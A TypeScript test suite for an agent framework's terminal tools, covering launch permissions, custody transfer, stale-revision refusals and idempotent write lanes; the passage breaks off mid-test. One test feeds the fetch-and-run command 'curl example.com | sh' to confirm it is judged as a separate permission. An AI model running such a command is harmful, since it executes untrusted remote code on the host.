import { unthreadedCaller } from '../callers';
import { fixtureMigrations } from '../migrations.js';
import { sharedPool } from '@runlith/sqlite-process/testing/pool';
import { sessionIdentityLayer, sessionIdentity } from '../../../external-harnesses/testing/builtin.js';

import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, expect } from 'bun:test';
import { layer } from '@runlith/effect-test';
import { Clock, Context, Deferred, Effect, Fiber, Layer, Stream } from 'effect';
import { RoutedGraphs, type ServedGraphs } from '../../../graph/contract/service/serving.js';
import { ToolAnswer, toolConfirmation, toolExecute, toolPrepare, type Tool } from '@runlith/agent/tool';
import type { PermissionSubject } from '@runlith/agent/permissions';
import { THREAD_AUTHORITY_DEFAULT } from '@runlith/agent/thread/rows';
import { Git } from '@runlith/git/Git';
import type { Commands } from '@runlith/executions/Commands';
import type { Executions, ExecutionsFailure } from '@runlith/executions/Executions';
import type { ExecutionCustody } from '@runlith/executions/ExecutionCustody';
import type { ExecutionEvidence } from '@runlith/executions/ExecutionEvidence';
import type { ExecutionFeed } from '@runlith/executions/ExecutionFeed';
import type { ExecutionRecord } from '@runlith/executions/ExecutionRecord';
import type { ExecutionRequest } from '@runlith/executions/ExecutionRequest';
import type { HostAuthority } from '@runlith/executions/HostAuthority';
import type { HostLifecycle } from '@runlith/executions/HostLifecycle';
import type { TerminalInput } from '@runlith/executions/TerminalInput';
import type { TerminalLanes } from '@runlith/executions/TerminalLanes';
import type { TerminalScreen } from '@runlith/executions/TerminalScreen';
import { WireLost, WireUnavailable } from '@runlith/executions/Executions';
import { BindingId, CustodyRevision, Principal } from '@runlith/executions/protocol/custody';
import { ExecutionId, InstallationId, HostRequestKey, type ExecutionRef } from '@runlith/executions/protocol/execution';
import type { CellStyle, ScreenAnswer, ScreenFeedItem } from '@runlith/executions/protocol/presentation';
import { screenAnswer } from '@runlith/executions/protocol/presentationText';
import { ByteOffset } from '@runlith/executions/protocol/record';
import type { ExecutionSummary } from '@runlith/executions/protocol/runtime';
import type { StartAnswer } from '@runlith/executions/protocol/launch';
import type { InputAnswer } from '@runlith/executions/protocol/input';
import type { CustodyAnswer, CustodyRequest } from '@runlith/executions/protocol/control';
import type { AuthorityAnswer } from '@runlith/executions/protocol/wire';
import { MachineStore } from '../../../platform/contract/service/store.js';
import { MachineUnits } from '../../../platform/contract/service/units.js';
import { unitsLayer } from '../../../platform/store/units.js';
import { runGit } from '../../../platform/git/ownGit.js';
import { machineFileLayer } from '../../../platform/store/open.js';
import { project as projectRow } from '../../../projects/testing/doubles.js';
import { bornThread } from '../../../native-harness/testing/born.js';
import { scopeRecord } from '../../../thread-record/testing/records.js';
import { fixtureRoot } from '../../../platform/testing/roots.js';
import { fixtureGraph } from '../fixtureGraph.js';
import { projectsLayer } from '../../../projects/testing/doubles.js';
import { hostWorkspace } from '../hostWorkspace.js';
import { worktreeRecordsLayer } from '../../../worktrees/layer.js';
import { Coverage } from '../../../workspace/contract/service/roots.js';
import { makeMachineWorld } from '../../../executions/testing/doubles.js';
import { fixtureNativeCatalog as nativeCatalog } from '../nativeCatalog.js';
import { ThreadId } from '../../../platform/contract/wire/thread.js';
import { TERMINAL_OPERATION_IDS } from '../../../executions/contract/wire/operations/terminalCatalog.js';
import { tagIndex } from '../../../graph/testing/doubles.js';
import { TerminalAccess } from '../../../executions/contract/service/access.js';
import { ActingRun } from '../../../executions/contract/service/grants.js';
import { TerminalTargets } from '../../../executions/contract/service/targets.js';
import { terminalAdmission } from '../../../executions/testing/doubles.js';
import { grantBook } from '../../../executions/testing/doubles.js';
import { executionTargets } from '../../../executions/testing/doubles.js';
import { terminalReconciliation } from '../../../executions/testing/doubles.js';
import { Custody } from '../../../executions/contract/service/custody.js';
import { Discharge } from '../../../executions/contract/service/discharge.js';
import { ExecutionHost, HostManagement } from '../../../executions/contract/service/host.js';
import { TerminalAdopters } from '../../../executions/contract/service/adopters.js';
import { executionPolicy, noAdopters } from '../../../executions/testing/doubles.js';
import { ExecutionProcessEvidence, ExecutionRecords, TerminalScreens } from '../../../executions/contract/service/records.js';
import { ManagedCommands } from '../../../executions/contract/service/commands.js';
import { TerminalRequests, Terminals } from '../../../executions/contract/service/terminals.js';
import { TerminalWriting } from '../../../executions/contract/service/writing.js';
import { hostTerminals } from '../../../executions/testing/doubles.js';
import { terminalInventory } from '../../../executions/testing/doubles.js';
import { commandLine } from '../../../executions/contract/wire/terminals.js';
import type { TerminalOperationKey } from '../../../executions/contract/wire/requestKeys.js';
import { terminalThreads, watchedQueue } from '../../../executions/testing/doubles.js';
import { targetIdentity, targetKeyOf } from '../../../executions/terminals/subjectPolicy.js';
import { terminalWriters } from '../../../executions/testing/doubles.js';
import { waitersOver } from '../../../executions/testing/waitersFixture.js';
import { storesOver } from '../../../executions/testing/stores.js';
import { BEHAVIOUR_REGISTRY } from '../composed.js';

const machineWorld = makeMachineWorld(() => null);

const installation = InstallationId.make('terminal-tools');
const holder = ThreadId.make('thread-tools');
const stranger = ThreadId.make('thread-stranger');
const archived = ThreadId.make('thread-archived');
const elsewhere = ThreadId.make('thread-elsewhere');

const undeclared = <A>(verb: string): Effect.Effect<A, ExecutionsFailure> =>
  new WireUnavailable({ kind: 'unreachable', reason: `this fixture declares no answer for ${verb}`, sent: false });

type HostAnswers = {
  readonly start?: () => Effect.Effect<StartAnswer, ExecutionsFailure>;
  readonly state?: () => Effect.Effect<ExecutionSummary | undefined, ExecutionsFailure>;
  readonly custody?: (request: CustodyRequest, principal: Principal) => Effect.Effect<CustodyAnswer, ExecutionsFailure>;
  readonly openBinding?: () => Effect.Effect<AuthorityAnswer, ExecutionsFailure>;
  readonly closeBinding?: (binding: BindingId) => Effect.Effect<AuthorityAnswer, ExecutionsFailure>;
  readonly input?: () => Effect.Effect<InputAnswer, ExecutionsFailure>;
  readonly screen?: () => Effect.Effect<ScreenFeedItem, ExecutionsFailure>;
  readonly generation?: number;
  readonly watching?: boolean;
};

type ControlledHost = {
  readonly port: Executions['Service'] &
    Commands['Service'] &
    ExecutionRequest['Service'] &
    ExecutionRecord['Service'] &
    ExecutionFeed['Service'] &
    TerminalScreen['Service'] &
    TerminalInput['Service'] &
    TerminalLanes['Service'] &
    ExecutionCustody['Service'] &
    ExecutionEvidence['Service'] &
    HostAuthority['Service'] &
    HostLifecycle['Service'];
  readonly asked: () => Readonly<Record<string, number>>;
};

const hostThat = (answers: HostAnswers): ControlledHost => {
  const asked: Record<string, number> = {};
  const count = (verb: string) => {
    asked[verb] = (asked[verb] ?? 0) + 1;
  };
  const port = {
    status: () => undeclared<never>('status'),
    list: () => undeclared<never>('list'),
    changes: () => undeclared<never>('changes'),
    state: () => {
      count('state');
      return answers.state?.() ?? undeclared<ExecutionSummary | undefined>('state');
    },
    ending: () => undeclared<never>('ending'),
    retained: () => undeclared<never>('retained'),
    operation: () => undeclared<never>('operation'),
    callResult: () => undeclared<never>('callResult'),
    preventStop: () => undeclared<never>('preventStop'),
    start: () => {
      count('start');
      return answers.start?.() ?? undeclared<StartAnswer>('start');
    },
    cancelStart: () => undeclared<never>('cancelStart'),
    read: () => undeclared<never>('read'),
    subscribe: () => {
      count('subscribe');
      return answers.watching === true ? Stream.never : Stream.fromEffect(undeclared<never>('subscribe'));
    },
    screen: (_execution, request) => {
      count('screen');
      const update = answers.screen?.();
      return update === undefined
        ? undeclared<ScreenAnswer>('screen')
        : Effect.map(update, (held) => screenAnswer(held, request?.cells === true));
    },
    point: () => undeclared<never>('point'),
    input: () => {
      count('input');
      return answers.input?.() ?? undeclared<InputAnswer>('input');
    },
    signal: () => {
      count('signal');
      return undeclared<never>('signal');
    },
    processes: () => undeclared<never>('processes'),
    foreground: () => undeclared<never>('foreground'),
    listeners: () => undeclared<never>('listeners'),
    hostListeners: () => undeclared<never>('hostListeners'),
    capabilities: () => undeclared<never>('capabilities'),
    generation: () => (answers.generation === undefined ? undeclared<never>('generation') : Effect.succeed(answers.generation)),
    served: () => undeclared<never>('served'),
    custody: (request, principal) => {
      count('custody');
      return answers.custody?.(request, principal) ?? undeclared<CustodyAnswer>('custody');
    },
    stop: () => {
      count('stop');
      return undeclared<never>('stop');
    },
    retire: () => undeclared<never>('retire'),
    command: () => undeclared<never>('command'),
    commands: () => undeclared<never>('commands'),
    commandsAt: () => undeclared<never>('commandsAt'),
    revise: () => undeclared<never>('revise'),
    take: () => undeclared<never>('take'),
    fence: () => undeclared<never>('fence'),
    release: () => undeclared<never>('release'),
    grant: () => undeclared<never>('grant'),
    openBinding: () => {
      count('openBinding');
      return answers.openBinding?.() ?? undeclared<AuthorityAnswer>('openBinding');
    },
    closeBinding: (binding) => {
      count('closeBinding');
      return answers.closeBinding?.(binding) ?? undeclared<AuthorityAnswer>('closeBinding');
    },
    open: () => undeclared<never>('open'),
    inputs: () => undeclared<never>('inputs'),
    quiesce: () => undeclared<never>('quiesce'),
    resume: () => undeclared<never>('resume'),
    prepare: () => undeclared<never>('prepare'),
    yield: () => undeclared<never>('yield'),
    shutdown: () => undeclared<never>('shutdown'),
    pace: () => undeclared<never>('pace'),
    disown: () => undeclared<never>('disown'),
    endResidual: () => undeclared<never>('endResidual'),
    endProcess: () => undeclared<never>('endProcess'),
    load: () => undeclared<never>('load'),
  } satisfies Executions['Service'] &
    Commands['Service'] &
    ExecutionRequest['Service'] &
    ExecutionRecord['Service'] &
    ExecutionFeed['Service'] &
    TerminalScreen['Service'] &
    TerminalInput['Service'] &
    TerminalLanes['Service'] &
    ExecutionCustody['Service'] &
    ExecutionEvidence['Service'] &
    HostAuthority['Service'] &
    HostLifecycle['Service'];
  return { port, asked: () => asked };
};

const owned = fixtureRoot('terminal-tools', '');
mkdirSync(owned, { recursive: true });
const home = mkdtempSync(join(owned, 'a-'));
const checkout = join(home, 'checkout');
mkdirSync(join(checkout, 'src'), { recursive: true });
afterAll(() => rmSync(home, { force: true, recursive: true }));

const environment = hostWorkspace(machineWorld)
  .pipe(
    Layer.provide(worktreeRecordsLayer),
    Layer.provideMerge(unitsLayer(MachineUnits, MachineStore)),
    Layer.provideMerge(fixtureGraph({ sourcePath: checkout }).pipe(Layer.provideMerge(projectsLayer()))),
    Layer.provideMerge(
      Layer.unwrap(
        Effect.map(sharedPool, (pool) =>
          Layer.orDie(machineFileLayer(join(home, 'db.sqlite'), fixtureMigrations, { durable: false }, pool)),
        ),
      ),
    ),
  )
  .pipe(Layer.provideMerge(sessionIdentityLayer));

type Environment = Layer.Success<typeof environment>;

const seeded = Effect.gen(function* () {
  const context = yield* Effect.context<Environment>();
  const git = Context.get(context, Git);
  yield* runGit(git, 'fixture', ['-C', checkout, 'init', '-q', '-b', 'main', '.']);
  yield* Effect.promise(() => Bun.write(join(checkout, 'src', 'a.ts'), 'export const one = 1;\n'));
  yield* runGit(git, 'fixture', ['-C', checkout, 'add', '--', 'src']);
  yield* runGit(git, 'fixture', ['-C', checkout, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'as it stood']);
  const store = Context.get(context, MachineStore);
  const at = new Date(yield* Clock.currentTimeMillis);
  const projectOf = (name: string, rootPath: string) =>
    Effect.map(
      store.db
        .insert(projectRow())
        .values({ name, repoKey: `${name}-key`, rootPath, createdAt: at })
        .returning({ id: projectRow().id }),
      (rows) => rows[0]?.id ?? 0,
    );
  const projectId = yield* projectOf('terminal-tools', checkout);
  const otherProjectId = yield* projectOf('terminal-elsewhere', join(home, 'elsewhere'));
  for (const id of [holder, stranger, archived, elsewhere]) {
    yield* bornThread(store.db, {
      id,
      ownerId: 'owner',
      agentId: 'tagma',
      spawnRootId: id,
      cacheGroup: id,
      authority: THREAD_AUTHORITY_DEFAULT,
      createdAt: at,
      updatedAt: at,
    });
  }
  for (const facet of [
    { threadId: holder, projectId },
    { threadId: stranger, projectId },
    { threadId: archived, projectId, archivedAt: at },
    { threadId: elsewhere, projectId: otherProjectId },
  ]) {
    const { threadId, ...place } = facet;
    yield* scopeRecord(store.db, threadId, place);
  }
  const targets = yield* executionTargets();
  yield* Context.get(context, Coverage).cover(projectId);
  const resolved = yield* targets.resolve({ projectId, kind: 'host', cwd: checkout });
  return {
    context,
    store,
    units: Context.get(context, MachineUnits),
    terminalStore: storesOver(store.db, installation),
    projectId,
    targets,
    resolved,
  };
});

class Fixture extends Context.Service<Fixture, Effect.Success<typeof seeded>>()('terminalTools/Fixture') {}

const caller = (projectId: number, thread: ThreadId) => ({
  actor: {
    kind: 'thread' as const,
    threadId: thread,
    projectId,
    principalId: 'owner',
    session: { harness: 'tagma', key: thread },
  },
  files: { path: home, resolve: (candidate: string) => join(home, candidate) },
});

const catalogOver = Effect.fnUntraced(function* (
  host: ControlledHost,
  thread: ThreadId = holder,
  writers: Effect.Success<ReturnType<typeof terminalWriters>> | null = null,
  runId: string | null = null,
) {
  const { context, store, terminalStore, projectId, targets } = yield* Fixture;
  const grants = grantBook({ executions: host.port });
  const access = terminalAdmission({ grants, threads: terminalThreads({ db: store.db }) });
  const terminals = yield* hostTerminals({
    executions: host.port,
    targets,
    requestKeys: terminalStore.requestKeys,
    intents: terminalStore.intents,
    terminalRows: terminalStore.terminalRows,
    commandRows: terminalStore.commandRows,
    deliveries: terminalStore.deliveries,
    installation,
    grants,
    reconciliation: yield* terminalReconciliation({
      executions: host.port,
      requestKeys: terminalStore.requestKeys,
      intents: terminalStore.intents,
      terminalRows: terminalStore.terminalRows,
      commandRows: terminalStore.commandRows,
      installation,
      grants,
    }),
    watched: yield* watchedQueue(),
    cell: yield* terminalInventory({ executions: host.port }),
    waiters: yield* waitersOver(terminalStore.deliveries),
    writers,
  });
  const owners = Context.merge(
    context,
    Context.empty().pipe(
      Context.add(Terminals, terminals),
      Context.add(TerminalRequests, terminals),
      Context.add(TerminalWriting, terminals),
      Context.add(Custody, terminals),
      Context.add(ExecutionRecords, terminals),
      Context.add(TerminalScreens, terminals),
      Context.add(ExecutionProcessEvidence, terminals),
      Context.add(Discharge, terminals),
      Context.add(ExecutionHost, terminals),
      Context.add(TerminalAdopters, noAdopters),
      Context.add(HostManagement, {
        standing: Effect.succeed({ state: { _tag: 'Unmeasured', geometry: executionPolicy().execution.geometry } }),
      } as unknown as HostManagement['Service']),
      Context.add(ManagedCommands, terminals.commands),
      Context.add(TerminalAccess, access),
      Context.add(TerminalTargets, targets),
      Context.add(ActingRun, { runId }),
      Context.add(RoutedGraphs, { checkout: () => Effect.succeed(checkout) } as unknown as ServedGraphs['Service']),
    ),
  );
  const tools = yield* nativeCatalog(
    {
      place: { root: checkout, origin: null },
      caller: caller(projectId, thread),
      project: { id: projectId, name: 'terminal-tools' },
      vocabulary: () => tagIndex([], BEHAVIOUR_REGISTRY),
      identity: sessionIdentity,
      world: 'checkout',
      graphRoot: checkout,
      owners,
    },
    TERMINAL_OPERATION_IDS,
  );
  return { grants, terminals, tools, owners };
});

const toolsOver = (host: ControlledHost, thread: ThreadId = holder) => Effect.map(catalogOver(host, thread), (over) => over.tools);

const call = { toolCallId: 'call-under-test', caller: unthreadedCaller, messages: [] };

const preparing = (tool: Tool, input: unknown) => {
  const prepare = toolPrepare(tool);
  if (prepare === null) return Effect.die('this tool resolves nothing');
  return prepare(input, call);
};

const dispatching = (tool: Tool, input: unknown, prepared: unknown) => {
  const execute = toolExecute(tool);
  if (execute === null) return Effect.die('this tool declares no body');
  return execute(input, { ...call, prepared }).pipe(Effect.map((answer) => (answer instanceof ToolAnswer ? answer.value : answer)));
};

const walk = Effect.fnUntraced(function* (tool: Tool, input: unknown) {
  const prepare = toolPrepare(tool);
  const prepared = prepare === null ? undefined : yield* prepare(input, call);
  const execute = toolExecute(tool);
  if (execute === null) return yield* Effect.die('this tool declares no body');
  const answer = yield* execute(input, { ...call, prepared: prepared?.prepared });
  return answer instanceof ToolAnswer ? answer.value : answer;
});

const execution = (id: string): ExecutionRef => ({ installation, execution: ExecutionId.make(id), incarnation: 1 });

const projected = Effect.fnUntraced(function* (executionId: string) {
  const { units, terminalStore } = yield* Fixture;
  const record = yield* units.read((unit) => terminalStore.terminalRows.record(unit, executionId));
  if (record === null) return yield* Effect.die('the start projected nothing');
  return record;
});

const keyOf = Effect.fnUntraced(function* (operationId: string) {
  const { units, terminalStore, projectId } = yield* Fixture;
  return yield* units.read((unit) => terminalStore.requestKeys.operation(unit, projectId, HostRequestKey.make(operationId)));
});

const moveCustody = Effect.fnUntraced(function* (executionId: string) {
  const { units, terminalStore } = yield* Fixture;
  const standing = yield* projected(executionId);
  yield* units.write('terminalTools.moveCustody', (unit) =>
    terminalStore.terminalRows.project(unit, {
      ...standing,
      revision: CustodyRevision.make(standing.revision + 1),
      holder: Principal.make(`thread:${stranger}`),
      heldBy: stranger,
    }),
  );
  return standing.revision;
});

const runningSummary = (ref: ExecutionRef): ExecutionSummary => ({
  state: {
    ref,
    transport: 'pipes',
    lifetime: 'held',
    purpose: 'command',
    phase: 'running',
    streams: { stdout: 'open', stderr: 'open', pty: 'open' },
    cleanup: 'pending',
    record: 'available',
  },
  custody: {
    revision: 1,
    holder: Principal.make(`thread:${holder}`),
    origin: Principal.make(`thread:${holder}`),
    target: { environment: 'host', namespace: 'machine', cwd: checkout, dependencies: [] },
  },
  streams: [],
  native: { pid: 4242 },
  input: { acceptedThrough: ByteOffset.make('0'), pendingBytes: 0 },
});

const started = (ref: ExecutionRef): StartAnswer => ({
  _tag: 'Started',
  operation: { installation, operation: HostRequestKey.make('unused') },
  execution: ref,
  state: runningSummary(ref).state,
  native: { pid: 4242 },
});

const startInput = (operationId: string) => ({
  operationId,
  cwd: checkout,
  program: '/bin/sh',
  args: ['-c', 'true'],
  transport: 'pipes' as const,
  lifetime: 'held' as const,
});

const writeInput = (ref: ExecutionRef, operationId: string) => ({
  operationId,
  execution: ref.execution,
  incarnation: ref.incarnation,
  bytes: Buffer.from('ls\n', 'utf8').toString('base64'),
});

const laneHost = (ref: ExecutionRef, extra: HostAnswers = {}): ControlledHost => {
  let sequence = 0;
  let opened = 0;
  return hostThat({
    start: () => Effect.succeed(started(ref)),
    state: () => Effect.succeed(runningSummary(ref)),
    openBinding: () =>
      Effect.sync(() => {
        sequence = 0;
        return {
          _tag: 'Bound',
          binding: BindingId.make(`lane-${ref.execution}-${opened++}`),
          principal: Principal.make(`thread:${holder}`),
          epoch: 1,
        } satisfies AuthorityAnswer;
      }),
    closeBinding: (binding) => Effect.succeed({ _tag: 'Unbound', binding } satisfies AuthorityAnswer),
    input: () =>
      Effect.succeed({
        _tag: 'InputAdmitted',
        receipt: { execution: ref, sequence: sequence++, cause: 'raw', bytes: 3, acceptedThrough: ByteOffset.make('3') },
      } satisfies InputAnswer),
    ...extra,
  });
};

const CELL_STYLE: CellStyle = {
  foreground: { _tag: 'Default' },
  background: { _tag: 'Default' },
  underlineColor: { _tag: 'Default' },
  underline: 'none',
  bold: false,
  dim: false,
  italic: false,
  blink: false,
  inverse: false,
  invisible: false,
  strikethrough: false,
  overline: false,
};

const screenOf = (ref: ExecutionRef, lines: readonly string[], columns: number): ScreenFeedItem => ({
  _tag: 'ScreenFrame',
  provenance: { ref, revision: 7, parsedThrough: ByteOffset.make('4096') },
  buffer: 'normal',
  geometry: { rows: lines.length, columns, firstLine: 0, viewportLine: 0 },
  rows: lines.map((text, line) => ({
    line,
    wrapped: false,
    cells: [...text.padEnd(columns)].map((chars) => ({ chars, width: 1, style: CELL_STYLE })),
  })),
  cursor: { line: 2, column: 5 },
  appearance: {
    colors: { palette: Array.from({ length: 256 }, () => 0), foreground: 0, background: 0, cursor: 0 },
    cursor: { visible: true, style: 'block', blink: false },
    title: 'vite',
  },
  input: {
    _tag: 'Available',
    revision: 1,
    profile: 'xterm-256color-unicode11',
    encoding: 'utf-8',
    terminal: 'xterm-256color',
    unicodeVersion: '11',
    applicationCursor: false,
    applicationKeypad: false,
    bracketedPaste: true,
    sendFocus: false,
    mouseTracking: 'none',
    mouseEncoding: 'default',
    alternateScreen: false,
    kittyKeyboardFlags: 1,
  },
});

const VITE = ['$ vite dev', '', '  VITE v7.1.14  ready in 412 ms', '', '  \u279c  Local:   http://localhost:5173/'];

type Answer = { readonly status: string; readonly code?: string };

layer(Layer.provideMerge(Layer.effect(Fixture, seeded), environment), { excludeTestServices: true })('terminal tools', (it) => {
  it.effect('a start is bound to the target its own preparation resolved', () =>
    Effect.gen(function* () {
      const { resolved } = yield* Fixture;
      const ref = execution('exec-bound');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const answer = (yield* walk((yield* toolsOver(host)).start_terminal as Tool, startInput('op-bound'))) as Answer;
      expect(answer.status).toBe('ok');
      expect(host.asked().start).toBe(1);

      const key = yield* keyOf('op-bound');
      expect(key._tag).toBe('Settled');
      const principal = Principal.make(`thread:${holder}`);
      if (key._tag === 'Settled') {
        expect(key.key.targetKey).toBe(targetKeyOf(targetIdentity(resolved, principal, principal)));
        expect(key.key.requester).toBe(principal);
        expect(key.key.mutation).toBe('start');
        expect(key.execution?.execution).toBe(ref.execution);
      }
    }),
  );

  it.effect('a start the host refused answers refused, never ok', () =>
    Effect.gen(function* () {
      const host = hostThat({
        start: () =>
          Effect.succeed({
            _tag: 'Refused',
            operation: { installation, operation: HostRequestKey.make('unused') },
            refusal: { _tag: 'Unauthorized', reason: 'this floor launches nothing for you' },
          } satisfies StartAnswer),
      });
      const answer = (yield* walk((yield* toolsOver(host)).start_terminal as Tool, startInput('op-start-refused'))) as Answer;
      expect(answer.status).toBe('refused');
      expect(answer.code).toBe('terminal-ineligible');
      expect((yield* keyOf('op-start-refused'))._tag).toBe('Settled');
    }),
  );

  it.effect('a lost start reply is recovered by its own key without a second launch', () =>
    Effect.gen(function* () {
      const ref = execution('exec-recovered');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-recovered'));
      expect(host.asked().start).toBe(1);

      const recovered = (yield* walk(tools.read_terminal_operation as Tool, { operationId: 'op-recovered' })) as {
        status: string;
        operation: { _tag: string; state?: { _tag: string; execution?: ExecutionRef } };
      };
      expect(recovered.status).toBe('ok');
      expect(recovered.operation._tag).toBe('Whole');
      expect(recovered.operation.state?._tag).toBe('Settled');
      expect(recovered.operation.state?.execution?.execution).toBe(ref.execution);
      expect(host.asked().start).toBe(1);
    }),
  );

  it.effect('a thread typing into an execution another holds is asked about it, and takes custody before anything is typed', () =>
    Effect.gen(function* () {
      const ref = execution('exec-not-held');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      yield* walk((yield* toolsOver(host)).start_terminal as Tool, startInput('op-not-held'));
      const tool = (yield* toolsOver(host, stranger)).write_terminal as Tool;
      const input = {
        operationId: 'op-not-held-write',
        execution: ref.execution,
        incarnation: ref.incarnation,
        bytes: Buffer.from('ls\n', 'utf8').toString('base64'),
      };

      const prepared = yield* preparing(tool, input);
      expect(prepared.raised?.map((one) => one.condition)).toEqual(['not-holder']);
      yield* Effect.result(walk(tool, input));
      expect(host.asked().custody).toBe(1);
      expect(host.asked().input).toBeUndefined();
    }),
  );

  it.effect('an execution this installation cannot place refuses without reaching the host', () =>
    Effect.gen(function* () {
      const host = hostThat({});
      const answer = (yield* walk((yield* toolsOver(host)).read_terminal as Tool, {
        execution: 'never-started',
        incarnation: 1,
      })) as Answer;
      expect(answer.status).toBe('refused');
      expect(answer.code).toBe('terminal-unknown');
      expect(host.asked()).toEqual({});
    }),
  );

  it.effect('an expired wait budget ends nothing', () =>
    Effect.gen(function* () {
      const ref = execution('exec-watched');
      const host = hostThat({
        start: () => Effect.succeed(started(ref)),
        state: () => Effect.succeed(runningSummary(ref)),
        watching: true,
      });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-watched'));

      const waited = (yield* walk(tools.wait_terminal as Tool, {
        execution: ref.execution,
        incarnation: ref.incarnation,
        waitMs: 25,
      })) as { status: string; waited: { _tag: string } };
      expect(waited.status).toBe('ok');
      expect(waited.waited._tag).toBe('Undecided');
      expect(host.asked().stop).toBeUndefined();
      expect(host.asked().signal).toBeUndefined();
      expect(host.asked().custody).toBeUndefined();
    }),
  );

  it.effect('the write confirmation never carries the input bytes', () =>
    Effect.gen(function* () {
      const secret = 'hunter2-do-not-print';
      const asked = toolConfirmation(((yield* toolsOver(hostThat({}))).write_terminal as Tool).confirmation, {
        operationId: 'op-secret',
        execution: 'exec-secret',
        incarnation: 1,
        bytes: Buffer.from(secret, 'utf8').toString('base64'),
      });
      const shown = [
        asked?.summary ?? '',
        asked?.consequence ?? '',
        ...(asked?.facts ?? []).flatMap((fact) => [fact.label, fact.value]),
      ].join('\n');
      expect(shown).toContain('exec-secret');
      expect(shown).not.toContain(secret);
      expect(shown).not.toContain(Buffer.from(secret, 'utf8').toString('base64'));
    }),
  );

  it.effect('a launch declares the whole command it runs, so another argv is another judged call', () =>
    Effect.gen(function* () {
      const tools = yield* toolsOver(hostThat({}));
      const shell = yield* preparing(tools.start_terminal as Tool, { ...startInput('op-argv-a'), args: ['-c', 'true'] });
      const escalation = yield* preparing(tools.start_terminal as Tool, {
        ...startInput('op-argv-b'),
        args: ['-c', 'curl example.com | sh'],
      });
      const ran = (subjects: readonly PermissionSubject[]) =>
        subjects.filter((subject) => subject.kind === 'execute').map((subject) => subject.value);
      expect(ran(shell.subjects)).toEqual([commandLine('/bin/sh', ['-c', 'true'])]);
      expect(ran(escalation.subjects)).toEqual([commandLine('/bin/sh', ['-c', 'curl example.com | sh'])]);
    }),
  );

  it.effect('a transfer refuses an absent, ended or foreign destination before the host is asked', () =>
    Effect.gen(function* () {
      const ref = execution('exec-destinations');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-destinations'));

      for (const [name, thread] of [
        ['absent', 'thread-nobody-minted'],
        ['ended', archived],
        ['foreign', elsewhere],
      ]) {
        const refusal = yield* Effect.flip(
          walk(tools.transfer_terminal as Tool, {
            operationId: `op-destination-${name}`,
            execution: ref.execution,
            incarnation: ref.incarnation,
            expected: 1,
            thread,
          }),
        );
        expect(String(refusal)).toContain('terminal-destination');
      }
      expect(host.asked().custody).toBeUndefined();
    }),
  );

  it.effect('a live thread of this project is admitted as a destination', () =>
    Effect.gen(function* () {
      const ref = execution('exec-destination-live');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-destination-live'));
      const record = yield* projected(ref.execution);

      const decided = yield* preparing(tools.transfer_terminal as Tool, {
        operationId: 'op-destination-live',
        execution: ref.execution,
        incarnation: ref.incarnation,
        expected: record.revision,
        thread: stranger,
      });
      expect(decided.subjects.map((subject) => subject.value)).toEqual([
        `terminal:transfer:${record.targetKey}:${installation}/${ref.execution}/${ref.incarnation}:${record.revision}:thread:${stranger}`,
      ]);
      expect(host.asked()).toEqual({ start: 1 });
    }),
  );

  it.effect('a signal prepared over a revision that moved refuses instead of delivering', () =>
    Effect.gen(function* () {
      const ref = execution('exec-signal-stale');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-signal-stale'));

      const input = { execution: ref.execution, incarnation: ref.incarnation, signal: 'SIGWINCH' };
      const decided = yield* preparing(tools.signal_terminal as Tool, input);
      yield* moveCustody(ref.execution);

      const answer = (yield* dispatching(tools.signal_terminal as Tool, input, decided.prepared)) as Answer;
      expect(answer.status).toBe('refused');
      expect(answer.code).toBe('terminal-stale');
      expect(host.asked().signal).toBeUndefined();
    }),
  );

  it.effect('a stop prepared over a revision that moved refuses without spending its key', () =>
    Effect.gen(function* () {
      const ref = execution('exec-stop-stale');
      const host = hostThat({ start: () => Effect.succeed(started(ref)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-stop-stale'));

      const input = {
        operationId: 'op-stop-moved',
        execution: ref.execution,
        incarnation: ref.incarnation,
        cause: 'explicit-stop' as const,
      };
      const decided = yield* preparing(tools.stop_terminal as Tool, input);
      yield* moveCustody(ref.execution);

      const answer = (yield* dispatching(tools.stop_terminal as Tool, input, decided.prepared)) as Answer;
      expect(answer.status).toBe('refused');
      expect(answer.code).toBe('terminal-stale');
      expect(host.asked().stop).toBeUndefined();
      expect((yield* keyOf('op-stop-moved'))._tag).toBe('Unknown');
    }),
  );

  it.effect('a run’s writes open one lane and reuse it, and a lost answer reads back by its key without typing again', () =>
    Effect.gen(function* () {
      const ref = execution('exec-lane-reused');
      const host = laneHost(ref);
      const { tools } = yield* catalogOver(host, holder, null, 'run-lanes');
      yield* walk(tools.start_terminal as Tool, startInput('op-lane-reused'));
      const write = (operationId: string) => Effect.result(walk(tools.write_terminal as Tool, writeInput(ref, operationId)));

      const first = yield* write('op-lane-write-1');
      const second = yield* write('op-lane-write-2');
      const again = yield* write('op-lane-write-1');
      const readBack = (yield* walk(tools.read_terminal_operation as Tool, { operationId: 'op-lane-write-1' })) as {
        operation: { _tag: string; state?: { _tag: string; input?: { _tag: string } } };
      };

      expect(first._tag).toBe('Success');
      expect(second._tag).toBe('Success');
      expect(host.asked().openBinding).toBe(1);
      expect(host.asked().input).toBe(2);
      expect(again._tag === 'Success' ? JSON.stringify(again.success) : String(again.failure)).toContain('terminal-operation-conflict');
      expect(readBack.operation.state?._tag).toBe('Settled');
      expect(readBack.operation.state?.input?._tag).toBe('InputAdmitted');
    }),
  );

  it.effect(
    'a write whose frame may have reached the host settles its key uncertain and retires the lane, so the next write opens a fresh one',
    () =>
      Effect.gen(function* () {
        const ref = execution('exec-lane-doubt');
        let inputs = 0;
        const host = laneHost(ref, {
          input: () =>
            inputs++ === 0
